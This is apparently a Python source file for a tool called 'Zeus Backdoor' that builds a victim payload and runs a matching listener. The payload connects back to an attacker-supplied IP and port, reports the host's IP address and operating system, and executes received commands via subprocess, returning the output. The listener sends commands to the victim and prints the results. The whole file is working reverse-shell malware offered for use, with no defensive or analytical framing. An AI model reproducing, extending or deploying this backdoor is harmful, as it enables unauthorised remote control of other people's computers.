import socket
import os
import sys
import time
import platform
import subprocess


def Main():
    os.system("clear")
    print("\033[1;32m")
    os.system("figlet Zeus Backdoor")
    print("\t\t [ Coded by nightowl ]")
    print("[1] Python File")
    print("[2] Java File")
    print("[3] Php File")
    print("[4] Javascript File")
    print("[5] Exe")
    print("[6] Android")
    print("[7] Ruby")
    print("[8] Exit\033[0m")
    try:
        num = int(input("\n=> "))
        if num == 1: backdoor_py = Backdoor_Py()
    except KeyboardInterrupt:
        exit_func()

def exit_func():
    print("\n[",end="")
    for time_count in range(0,7):
        time.sleep(0.6)
        print("#",end="",flush=True)
    print("]\n")
    sys.exit()

class Backdoor_Py:
    def __init__(self):
        try:
            ip = str(input("[+] Enter to your local ip address => "))
            port = int(input("[+] Enter to your local port number => "))
            file_name = str(input("[+] Enter to file name for victim => "))
            self.create_python_file(ip,port,file_name)
            self.start_listener(ip,port)
        except KeyboardInterrupt:
            exit_func()
    def start_listener(self,ip,port):
        try:
            BUFF = 1024
            sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            sock.bind((ip,port))
            sock.listen()
            print("\n\033[1;32m[+] Listening...")
            while 1:
                conn,addr = sock.accept()
                with conn:
                    target_ip = conn.recv(BUFF)
                    print("\n\033[1;32m[+] Target IP Address =>{ip_addr} \n".format(ip_addr=target_ip.decode("utf-8")))
                    target_os_name = conn.recv(BUFF)
                    print("\n\033[1;32m[+] Target OS => {target_os_inf}\n".format(target_os_inf=target_os_name.decode("utf-8")))
                    user_command = str(input("\n=> "))
                    conn.sendall(
                            bytes(user_command,encoding="utf-8")
                        )
                    command_result = conn.recv(BUFF)
                    print(command_result.decode("utf-8").strip("[',']"))
            sock.close()
            
        except socket.error as sock_err:
            print("\n\033[1;31m[-] Socket Error => {err_no} \n\033[1;0m".format(err_no = sock_err))
            sock.close()
    def create_python_file(self,ip, port, file_name):
        py_code = """
import socket
import os
import sys
import time
import platform
import subprocess



LHOST = "{lhost}"

LPORT = {lport}

BUFF = 1024

def os_name():
    os_inf = platform.system()
    return os_inf


def local_ip():
    host = socket.gethostname()
    ip = socket.gethostbyname(host)
    return ip

def run_command_func(command):
    command_run = subprocess.check_output([
            command
        ]).decode("utf-8").split("\\n")
    return str(command_run)

sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

sock.connect((LHOST,LPORT))

sock.sendall(bytes(local_ip(),encoding="utf-8"))

sock.sendall(bytes(os_name(),encoding="utf-8"))

target_command = sock.recv(BUFF)

sock.sendall(bytes(run_command_func(target_command),encoding="utf-8"))

        """.format(lhost=ip,lport=port)

        with open(file_name+".py","wb") as file_open:
            file_open.write(bytes(py_code,encoding="utf-8"))



if __name__ == "__main__":
    Main()
